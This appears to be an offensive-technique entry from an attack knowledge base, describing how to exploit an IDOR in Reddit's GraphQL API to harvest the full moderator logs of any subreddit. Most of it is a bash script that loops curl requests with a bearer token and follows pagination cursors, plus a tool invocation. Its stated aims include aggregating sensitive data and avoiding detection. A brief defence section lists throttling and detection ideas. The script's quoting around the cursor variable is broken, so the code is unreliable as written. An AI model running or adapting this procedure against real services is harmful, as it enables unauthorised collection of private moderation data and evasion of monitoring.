---
tags:
  - pagination
  - data-exfiltration
  - idor
type: procedure
tools:
  - '[[tools/mod_logs-sh]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/reddit-graphql-modlogs-paginated]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Automated Collection]]'
updated_at: '2025-12-14T17:25:48.063Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 93c62cf8-85cb-4cae-8de1-8a9cd895cc01
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Automated Collection]]'
---
# Paginate-Through-Moderator-Logs

## Summary

This procedure iteratively sends paginated GraphQL queries to collect all moderator logs from a target subreddit, using the endCursor to bypass limits and fully exploit the IDOR.

## Description

By repeating the query with the 'after' variable set to the previous endCursor, attackers can compile exhaustive logs, including all historical bans, removals, and other actions, for any subreddit.

## Requirements

1. Bearer token and initial endCursor
2. Loop-capable scripting (bash/Python)
3. Output file for aggregation

## Defense

Defensive measures and detection strategies:

- Enforce query limits and time-based throttling on pagination
- Detect sequential cursor-based requests from single tokens
- Encrypt or restrict log access at the database level

## Objectives

1. Retrieve complete mod log dataset
2. Aggregate sensitive information
3. Avoid detection through controlled pacing

## Instructions

### Step 1: Initiate Pagination Loop

**Context**: Use a script to send repeated queries until hasNextPage is false.

**Command** ([[commands/reddit-graphql-modlogs-paginated]]):
```bash
cursor=""
while true; do
  payload='{"id":"6243efcbc61d","variables":{"subredditName":"target-subreddit"'
  if [ -n "$cursor" ]; then payload+=","after":"$cursor"'"; fi
  payload+='}}'
  response=$(curl -X POST https://gql.reddit.com/ \
    -H "Authorization: Bearer your_token" \
    -H "Content-Type: application/json" \
    -d "$payload")
  echo $response >> all_mod_logs.json
  has_next=$(echo $response | jq '.data.modLog.pageInfo.hasNextPage')
  if [ "$has_next" = "false" ]; then break; fi
  cursor=$(echo $response | jq -r '.data.modLog.pageInfo.endCursor')
done
```

> Appends responses to file; stops when no more pages. Expected: Full JSON logs.

### Step 2: Automate with Tool

**Context**: Run the provided shell script for simplicity.

**Command** ([[tools/mod_logs-sh]]):
```bash
./mod_logs.sh -t your_token -s target-subreddit > mod_log_out.txt
```

> Outputs paginated logs to file.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Automated Collection]]

### Sub-Techniques


## Commands Used

- [[commands/reddit-graphql-modlogs-paginated]]

## Tools Used

- [[tools/mod_logs-sh]]

## Tags

- automated-collection
- full-exfiltration
